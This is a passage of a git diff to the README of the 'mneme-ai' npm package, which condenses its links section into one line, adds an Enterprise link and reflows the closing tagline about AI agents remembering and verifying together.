+<sub><b>Open to:</b> truth-infrastructure / AI-safety / cross-vendor consensus collaboration · safety-critical AI consulting · vendor partnerships (embed Mneme inside Cursor / Continue / Cline / Claude Code / Grok CLI) · EU AI Act Article 50 compliance · full-time where the bottleneck is trust, not capability.</sub>
 
 </div>
 
@@ -320,21 +255,11 @@ Deep contract: <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener
 
 ## 🔗 Links
 
-- 📦 npm: <a href="https://www.npmjs.com/package/mneme-ai" target="_blank" rel="noopener">mneme-ai</a>
-- 💻 GitHub: <a href="https://github.com/patsa2561-art/mneme-ai" target="_blank" rel="noopener">patsa2561-art/mneme-ai</a>
-- 📘 Functions (EN): <a href="docs/FUNCTIONS-EN.md" target="_blank" rel="noopener">docs/FUNCTIONS-EN.md</a>
-- 📗 ฟังก์ชั่น (ไทย): <a href="docs/FUNCTIONS-TH.md" target="_blank" rel="noopener">docs/FUNCTIONS-TH.md</a>
-- 🤖 AI Agent Contract: <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">docs/AI_AGENT_CONTRACT.md</a>
-- 📜 CHANGELOG: <a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG.md</a>
-- 📃 License: <a href="LICENSE" target="_blank" rel="noopener">MIT</a>
-
----
+📦 <a href="https://www.npmjs.com/package/mneme-ai" target="_blank" rel="noopener">npm</a> · 💻 <a href="https://github.com/patsa2561-art/mneme-ai" target="_blank" rel="noopener">GitHub</a> · 📘 <a href="docs/FUNCTIONS-EN.md" target="_blank" rel="noopener">Functions (EN)</a> · 📗 <a href="docs/FUNCTIONS-TH.md" target="_blank" rel="noopener">ฟังก์ชั่น (ไทย)</a> · 🤖 <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">AI Agent Contract</a> · 🏛 <a href="docs/ENTERPRISE.md" target="_blank" rel="noopener">Enterprise</a> · 📜 <a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a> · 📃 <a href="LICENSE" target="_blank" rel="noopener">MIT</a>
 
 <div align="center">
-
-<sub>Mneme is the diamond in the dirt that nobody saw the value of — but cut and polished, it becomes the most valuable diamond in the world. That's the vision.</sub>
-
 <br/>
+<sub>Mneme is the diamond in the dirt nobody saw the value of — cut and polished, it becomes the most valuable diamond in the world. That's the vision.</sub>
+<br/><br/>
 <sub>Made with care for every AI agent that wants to remember + verify + reason together.</sub>
-
 </div>
